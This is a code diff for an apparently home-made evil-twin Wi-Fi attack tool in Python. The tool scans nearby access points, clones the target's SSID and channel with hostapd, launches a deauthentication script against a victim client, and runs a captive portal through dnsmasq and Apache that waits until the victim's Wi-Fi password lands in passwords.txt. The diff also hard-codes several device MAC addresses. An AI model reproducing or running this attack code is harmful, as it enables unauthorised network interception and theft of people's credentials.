@@ -9,8 +9,21 @@ from termcolor import cprint
 import subprocess
 import shlex
 import sys
+from ap_scanner import ap_client_scanner
+
+
+iphoneaf = '86:78:D0:1f:CF:86'
+onenode = '2E:E4:F0:11:48:B5'
+וubuntu = "98:3B:8F:03:29:0B"
+
+
 
 def count_file_chars():
+    """
+    Counts the characters in the passwords file in order to track changes
+    this function is mainly called to detect if the user inserted a password to
+    the captive domain
+    """
     char_count = 0
     with open('./website/passwords.txt', 'r') as file:
         content = file.read().replace(" ", "")
@@ -18,10 +31,10 @@ def count_file_chars():
     return char_count
 
 
-def start_dnsmasq():
+def start_dnsmasq(attack_inet):
     console.print(f'[bold][yellow]Starting DNS and DHCP services[/][/]')
     current_count = count_file_chars()
-    create_dnsconf_captive()
+    create_dnsconf_captive(attack_inet)
     args = shlex.split("dnsmasq -C config/dns.conf -d")
     p = subprocess.Popen(args, stdout=subprocess.PIPE)
     # out, err = p.communicate()
@@ -38,7 +51,7 @@ def start_dnsmasq():
     console.print(f'[bold][green]Password received![/][/]')
     console.print(f'[bold][yellow]Renabling internet access for the victim[/][/]')
     p.kill()
-    overwrite_dnsconf()
+    overwrite_dnsconf(attack_inet)
     p = subprocess.Popen(args, stdout=subprocess.PIPE)
     console.print(f'[bold][green]Internet access fully recovered ending the attack[/][/]')
     # out, err = p.communicate()
@@ -61,26 +74,29 @@ while 1:
         cprint(figlet_format('Goodbye!', font='slant'), 'green')
         exit()
     elif user_input == "1":
+        
+        # ((mac_addr, ap_name, channel, dbm_signal), chosen_client_mac)
         attack_inet = attack_inet_set()
         while attack_inet not in get_if_list() or attack_inet is None:
             attack_inet = prompt(f'Please insert correct interface name from the next list: [{" ".join(get_if_list())}] \n>> ')
         os.system('clear')
+        
+        scan_results = ap_client_scanner(attack_inet)
         internet_inet = internet_inet_set()
+        
         while internet_inet not in get_if_list() or internet_inet is None or internet_inet == attack_inet:
             internet_inet = prompt(f'Please another correct interface name from the next list: [{" ".join(get_if_list())}] \n>> ')
         set_inet_to_monitor(attack_inet)
+        # new_inet = create_new_inet(attack_inet)
         set_inet_unmanaged(attack_inet)
         set_netmask(attack_inet)
         set_iptables(attack_inet, internet_inet)
-        set_hostapd_conf(attack_inet, ssid, 1)
+        set_hostapd_conf(attack_inet, scan_results[0][1], scan_results[0][2])
         set_apache_serv()
         ap = subprocess.Popen(shlex.split('hostapd config/hostapd.conf'))
 
-        subprocess.Popen([sys.executable, 'attack.py', '26:18:1D:7C:7A:EB','2E:E4:F0:11:48:B5', "wlan1mon", "1"], start_new_session=True)
-        
-        # deauth_th = threading.Thread(target=deauth, args=('26:18:1D:7C:7A:EB','2E:E4:F0:11:48:B5', "wlan1mon", 1))
-        # deauth_th.start()
-        start_dnsmasq()
+        subprocess.Popen([sys.executable, 'attack.py', scan_results[0][0], scan_results[1], "wlan1", scan_results[0][2]], start_new_session=True).pid
+        start_dnsmasq(attack_inet)
         """
         here we need to print the password and stop!!
         """
